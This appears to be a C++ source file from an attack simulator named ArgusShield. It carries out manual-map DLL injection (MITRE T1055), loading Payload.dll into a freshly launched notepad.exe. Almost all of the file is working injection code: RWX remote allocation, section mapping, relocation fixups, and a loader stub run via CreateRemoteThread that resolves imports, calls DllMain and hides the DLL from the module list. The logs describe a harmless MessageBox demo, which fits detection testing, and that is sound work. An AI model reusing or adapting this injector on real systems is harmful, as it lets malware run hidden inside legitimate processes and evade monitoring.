// MappingLogic.cpp
// Full Manual Mapping DLL injection implementation
// Reads Payload.dll from disk and manually maps it into notepad.exe
// without using LoadLibrary — the DLL won't appear in the module list.

#include "MappingLogic.h"
#include "Logger.h"
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <sstream>
#include <vector>
#include <fstream>

// ============================================================
// Helper: Get the path to Payload.dll (same folder as this .exe)
// ============================================================
static std::wstring GetPayloadPath()
{
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    std::wstring pathStr(exePath);
    size_t pos = pathStr.find_last_of(L"\\");
    return pathStr.substr(0, pos + 1) + L"Payload.dll";
}

// ============================================================
// Helper: Read entire file into a byte vector
// ============================================================
static std::vector<BYTE> ReadFileToBuffer(const std::wstring& filePath)
{
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open())
        return {};

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer((size_t)size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size))
        return {};

    return buffer;
}

// ============================================================
// Helper: Find PID of a process by name
// ============================================================
static DWORD FindProcessByName(const wchar_t* processName)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(hSnap, &pe))
    {
        do
        {
            if (_wcsicmp(pe.szExeFile, processName) == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

// ============================================================
// Shellcode loader stub data structure
// This is written into the remote process and executed
// by CreateRemoteThread to call DllMain.
// ============================================================
struct ManualMappingData
{
    LPVOID pLoadLibraryA;
    LPVOID pGetProcAddress;
    LPVOID pImageBase;
};

// ============================================================
// The loader stub function that runs inside the target process.
// It resolves imports, then calls DllMain(DLL_PROCESS_ATTACH).
// ============================================================
#pragma runtime_checks( "", off )
#pragma optimize( "", off )
static DWORD WINAPI LoaderStub(ManualMappingData* pData)
{
    if (!pData)
        return 1;

    BYTE* pBase = (BYTE*)pData->pImageBase;

    // Typedefs for the functions we need
    typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
    typedef FARPROC(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
    typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);

    fnLoadLibraryA _LoadLibraryA = (fnLoadLibraryA)pData->pLoadLibraryA;
    fnGetProcAddress _GetProcAddress = (fnGetProcAddress)pData->pGetProcAddress;

    // Parse PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOpt = &pNt->OptionalHeader;

    // ---- Resolve Imports ----
    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0)
    {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pBase +
            pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        while (pImport->Name)
        {
            char* szModName = (char*)(pBase + pImport->Name);
            HMODULE hMod = _LoadLibraryA(szModName);

            if (hMod)
            {
                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pBase + pImport->OriginalFirstThunk);
                PIMAGE_THUNK_DATA pFunc = (PIMAGE_THUNK_DATA)(pBase + pImport->FirstThunk);

                if (!pImport->OriginalFirstThunk)
                    pThunk = pFunc;

                for (; pThunk->u1.AddressOfData; pThunk++, pFunc++)
                {
                    if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal))
                    {
                        pFunc->u1.Function = (ULONG_PTR)_GetProcAddress(
                            hMod, (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
                    }
                    else
                    {
                        PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)(pBase + pThunk->u1.AddressOfData);
                        pFunc->u1.Function = (ULONG_PTR)_GetProcAddress(hMod, pImportName->Name);
                    }
                }
            }

            pImport++;
        }
    }

    // ---- Execute TLS callbacks ----
    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size > 0)
    {
        PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(pBase +
            pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

        PIMAGE_TLS_CALLBACK* ppCallback = (PIMAGE_TLS_CALLBACK*)pTLS->AddressOfCallBacks;
        if (ppCallback)
        {
            for (; *ppCallback; ppCallback++)
            {
                (*ppCallback)((PVOID)pBase, DLL_PROCESS_ATTACH, nullptr);
            }
        }
    }

    // ---- Call DllMain ----
    if (pOpt->AddressOfEntryPoint)
    {
        fnDllMain _DllMain = (fnDllMain)(pBase + pOpt->AddressOfEntryPoint);
        _DllMain((HINSTANCE)pBase, DLL_PROCESS_ATTACH, nullptr);
    }

    // Clear the data so our function pointers aren't sitting in memory
    pData->pLoadLibraryA = nullptr;
    pData->pGetProcAddress = nullptr;
    pData->pImageBase = nullptr;

    return 0;
}

// Dummy function — used only to calculate the size of LoaderStub
static DWORD WINAPI LoaderStubEnd() { return 0; }
#pragma runtime_checks( "", restore )
#pragma optimize( "", restore )

// ============================================================
// Manual Mapping Attack (T1055 — Manual Map Injection)
// Full implementation: maps Payload.dll into notepad.exe
// ============================================================
bool PerformManualMapping()
{
    HANDLE hProcess = nullptr;

    try
    {
        LogActivity("============================================");
        LogActivity("ArgusShield Attack Simulator - Manual Mapping");
        LogActivity("============================================");
        LogActivity("Technique: Manual Map DLL Injection");
        LogActivity("MITRE ATT&CK: T1055 (Process Injection)");
        LogActivity("");

        // ======================================================
        // STEP 1: Read Payload.dll from disk
        // ======================================================
        LogActivity("[+] Starting Manual Mapping Demo");

        std::wstring payloadPath = GetPayloadPath();

        char narrowPath[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, payloadPath.c_str(), -1, narrowPath, MAX_PATH, NULL, NULL);
        LogActivity("    -> Payload: " + std::string(narrowPath));

        std::vector<BYTE> payloadData = ReadFileToBuffer(payloadPath);
        if (payloadData.empty())
        {
            LogActivity("[-] Failed to read Payload.dll!");
            LogActivity("[-] Ensure Payload.dll is in the same folder as this executable.");
            return false;
        }

        LogActivity("    -> Size: " + std::to_string(payloadData.size()) + " bytes");

        // ======================================================
        // Parse and validate PE headers
        // ======================================================
        BYTE* pPayload = payloadData.data();

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPayload;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        {
            LogActivity("[-] Invalid DOS signature in Payload.dll!");
            return false;
        }

        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pPayload + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        {
            LogActivity("[-] Invalid NT signature in Payload.dll!");
            return false;
        }

        // Verify it's a DLL
        if (!(pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL))
        {
            LogActivity("[-] Payload is not a DLL!");
            return false;
        }

        DWORD_PTR payloadImageBase = pNtHeaders->OptionalHeader.ImageBase;
        DWORD payloadSizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
        DWORD payloadEntryRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        DWORD payloadSizeOfHeaders = pNtHeaders->OptionalHeader.SizeOfHeaders;
        WORD  numberOfSections = pNtHeaders->FileHeader.NumberOfSections;

        {
            std::stringstream ss;
            ss << "    -> ImageBase: 0x" << std::hex << payloadImageBase;
            LogActivity(ss.str());
        }
        {
            std::stringstream ss;
            ss << "    -> SizeOfImage: 0x" << std::hex << payloadSizeOfImage
               << " (" << std::dec << payloadSizeOfImage << " bytes)";
            LogActivity(ss.str());
        }
        LogActivity("    -> Sections: " + std::to_string(numberOfSections));

        // ======================================================
        // STEP 2: Launch target process (notepad.exe)
        // ======================================================
        LogActivity("[+] Launching target process (notepad.exe)");

        // Start notepad.exe
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        wchar_t targetPath[] = L"C:\\Windows\\System32\\notepad.exe";

        BOOL created = CreateProcessW(
            targetPath, NULL, NULL, NULL, FALSE,
            0,  // Normal creation (not suspended — we inject into running process)
            NULL, NULL, &si, &pi
        );

        if (!created)
        {
            LogActivity("[-] Failed to launch notepad.exe. Error: " + std::to_string(GetLastError()));
            return false;
        }

        // Give notepad a moment to initialize
        Sleep(1000);

        hProcess = pi.hProcess;
        DWORD targetPID = pi.dwProcessId;

        LogActivity("    -> PID: " + std::to_string(targetPID));

        // Close the thread handle — we don't need it
        CloseHandle(pi.hThread);

        // ======================================================
        // STEP 3: Allocate memory in target process
        // ======================================================
        LogActivity("[+] Allocating memory");

        LPVOID remoteBase = VirtualAllocEx(
            hProcess,
            nullptr,
            payloadSizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!remoteBase)
        {
            LogActivity("[-] VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
            CloseHandle(hProcess);
            return false;
        }

        {
            std::stringstream ss;
            ss << "    -> Allocated 0x" << std::hex << payloadSizeOfImage
               << " bytes at 0x" << (DWORD_PTR)remoteBase;
            LogActivity(ss.str());
        }

        // ======================================================
        // STEP 4: Map PE sections
        // ======================================================
        LogActivity("[+] Mapping PE sections");

        // Write PE headers first
        SIZE_T written = 0;
        WriteProcessMemory(hProcess, remoteBase, pPayload, payloadSizeOfHeaders, &written);
        LogActivity("    -> Headers: " + std::to_string(written) + " bytes");

        // Write each section
        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < numberOfSections; i++)
        {
            if (pSectionHeader[i].SizeOfRawData == 0)
                continue;

            LPVOID sectionDest = (PBYTE)remoteBase + pSectionHeader[i].VirtualAddress;
            LPVOID sectionSrc = pPayload + pSectionHeader[i].PointerToRawData;

            WriteProcessMemory(hProcess, sectionDest, sectionSrc,
                pSectionHeader[i].SizeOfRawData, &written);

            char sectionName[9] = { 0 };
            memcpy(sectionName, pSectionHeader[i].Name, 8);

            std::stringstream ss;
            ss << "    -> [" << sectionName << "] at 0x"
               << std::hex << (DWORD_PTR)sectionDest
               << " (" << std::dec << written << " bytes)";
            LogActivity(ss.str());
        }

        // ======================================================
        // STEP 5: Resolve imports (logged — actual resolution in loader stub)
        // ======================================================
        LogActivity("[+] Resolving imports");

        // Log the import DLLs for visibility
        IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.VirtualAddress != 0 && importDir.Size > 0)
        {
            // Find the import data in our local copy
            PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtHeaders);
            for (int i = 0; i < numberOfSections; i++)
            {
                if (importDir.VirtualAddress >= pSec[i].VirtualAddress &&
                    importDir.VirtualAddress < pSec[i].VirtualAddress + pSec[i].SizeOfRawData)
                {
                    DWORD importFileOffset = pSec[i].PointerToRawData +
                        (importDir.VirtualAddress - pSec[i].VirtualAddress);

                    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pPayload + importFileOffset);

                    int dllCount = 0;
                    while (pImport->Name)
                    {
                        // Resolve file offset of the DLL name
                        DWORD nameOffset = 0;
                        for (int s = 0; s < numberOfSections; s++)
                        {
                            if (pImport->Name >= pSec[s].VirtualAddress &&
                                pImport->Name < pSec[s].VirtualAddress + pSec[s].SizeOfRawData)
                            {
                                nameOffset = pSec[s].PointerToRawData +
                                    (pImport->Name - pSec[s].VirtualAddress);
                                break;
                            }
                        }

                        if (nameOffset > 0)
                        {
                            const char* dllName = (const char*)(pPayload + nameOffset);
                            LogActivity("    -> " + std::string(dllName));
                        }

                        dllCount++;
                        pImport++;
                    }

                    LogActivity("    -> " + std::to_string(dllCount) + " import DLLs found (resolved by loader stub)");
                    break;
                }
            }
        }

        // ======================================================
        // STEP 6: Apply relocations
        // ======================================================
        LogActivity("[+] Applying relocations");

        DWORD_PTR delta = (DWORD_PTR)remoteBase - pNtHeaders->OptionalHeader.ImageBase;

        IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir.VirtualAddress != 0 && relocDir.Size > 0 && delta != 0)
        {
            // Find the relocation data in our local copy
            DWORD relocOffset = 0;
            pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
            for (int i = 0; i < numberOfSections; i++)
            {
                if (relocDir.VirtualAddress >= pSectionHeader[i].VirtualAddress &&
                    relocDir.VirtualAddress < pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData)
                {
                    relocOffset = pSectionHeader[i].PointerToRawData +
                        (relocDir.VirtualAddress - pSectionHeader[i].VirtualAddress);
                    break;
                }
            }

            if (relocOffset > 0)
            {
                DWORD relocProcessed = 0;
                int blockCount = 0;
                int fixupCount = 0;

                while (relocProcessed < relocDir.Size)
                {
                    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pPayload + relocOffset + relocProcessed);

                    if (pReloc->SizeOfBlock == 0)
                        break;

                    DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    WORD* pEntries = (WORD*)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

                    for (DWORD j = 0; j < numEntries; j++)
                    {
                        WORD type = pEntries[j] >> 12;
                        WORD offset = pEntries[j] & 0x0FFF;

                        if (type == IMAGE_REL_BASED_DIR64)
                        {
                            DWORD_PTR patchAddr = (DWORD_PTR)remoteBase + pReloc->VirtualAddress + offset;

                            DWORD_PTR originalValue = 0;
                            ReadProcessMemory(hProcess, (PVOID)patchAddr, &originalValue, sizeof(DWORD_PTR), nullptr);

                            DWORD_PTR relocatedValue = originalValue + delta;
                            WriteProcessMemory(hProcess, (PVOID)patchAddr, &relocatedValue, sizeof(DWORD_PTR), nullptr);
                            fixupCount++;
                        }
                        else if (type == IMAGE_REL_BASED_HIGHLOW)
                        {
                            DWORD_PTR patchAddr = (DWORD_PTR)remoteBase + pReloc->VirtualAddress + offset;

                            DWORD originalValue = 0;
                            ReadProcessMemory(hProcess, (PVOID)patchAddr, &originalValue, sizeof(DWORD), nullptr);

                            DWORD relocatedValue = originalValue + (DWORD)delta;
                            WriteProcessMemory(hProcess, (PVOID)patchAddr, &relocatedValue, sizeof(DWORD), nullptr);
                            fixupCount++;
                        }
                    }

                    relocProcessed += pReloc->SizeOfBlock;
                    blockCount++;
                }

                {
                    std::stringstream ss;
                    ss << "    -> " << blockCount << " blocks, " << fixupCount << " fixups (delta: 0x"
                       << std::hex << delta << ")";
                    LogActivity(ss.str());
                }
            }
            else
            {
                LogActivity("    -> Could not locate relocation data in file");
            }
        }
        else if (delta == 0)
        {
            LogActivity("    -> No relocation needed (loaded at preferred base)");
        }
        else
        {
            LogActivity("    -> No relocation directory present");
        }

        // ======================================================
        // STEP 7: Execute entry point (via loader stub + CreateRemoteThread)
        // ======================================================
        LogActivity("[+] Executing entry point");

        // Allocate memory for our mapping data structure
        ManualMappingData mappingData = { 0 };
        mappingData.pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        mappingData.pGetProcAddress = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
        mappingData.pImageBase = remoteBase;

        // Write the mapping data into the target process
        LPVOID remoteData = VirtualAllocEx(hProcess, nullptr, sizeof(ManualMappingData),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!remoteData)
        {
            LogActivity("[-] Failed to allocate data memory. Error: " + std::to_string(GetLastError()));
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, remoteData, &mappingData, sizeof(ManualMappingData), &written);

        // Write the loader stub function into the target process
        SIZE_T stubSize = (SIZE_T)((BYTE*)LoaderStubEnd - (BYTE*)LoaderStub);
        if (stubSize == 0 || stubSize > 0x10000)
            stubSize = 0x1000;  // Fallback: allocate 4KB for the stub

        LPVOID remoteStub = VirtualAllocEx(hProcess, nullptr, stubSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!remoteStub)
        {
            LogActivity("[-] Failed to allocate stub memory. Error: " + std::to_string(GetLastError()));
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, remoteStub, (LPVOID)LoaderStub, stubSize, &written);

        // Create a remote thread to execute the loader stub
        HANDLE hThread = CreateRemoteThread(
            hProcess,
            nullptr,
            0,
            (LPTHREAD_START_ROUTINE)remoteStub,
            remoteData,
            0,
            nullptr
        );

        if (!hThread)
        {
            LogActivity("[-] CreateRemoteThread failed. Error: " + std::to_string(GetLastError()));
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteStub, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Wait for the loader to finish (imports resolved, DllMain called)
        WaitForSingleObject(hThread, INFINITE);

        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);

        CloseHandle(hThread);

        if (exitCode == 0)
        {
            LogActivity("[+] Payload executed successfully");
        }
        else
        {
            LogActivity("[-] Loader stub returned error code: " + std::to_string(exitCode));
        }

        // Cleanup stub and data memory (leave the mapped DLL in place)
        VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteStub, 0, MEM_RELEASE);

        LogActivity("");
        LogActivity("============================================");
        LogActivity("[COMPLETE] MANUAL MAPPING SUCCESSFUL!");
        LogActivity("============================================");
        LogActivity("  -> notepad.exe (PID " + std::to_string(targetPID) + ") has injected DLL");
        LogActivity("  -> Payload.dll MessageBox should appear");
        LogActivity("  -> DLL does NOT appear in module list (invisible)");
        LogActivity("============================================");

        CloseHandle(hProcess);
        return (exitCode == 0);
    }
    catch (...)
    {
        LogActivity("[EXCEPTION] Error during manual mapping");
        if (hProcess)
        {
            CloseHandle(hProcess);
        }
        return false;
    }
}
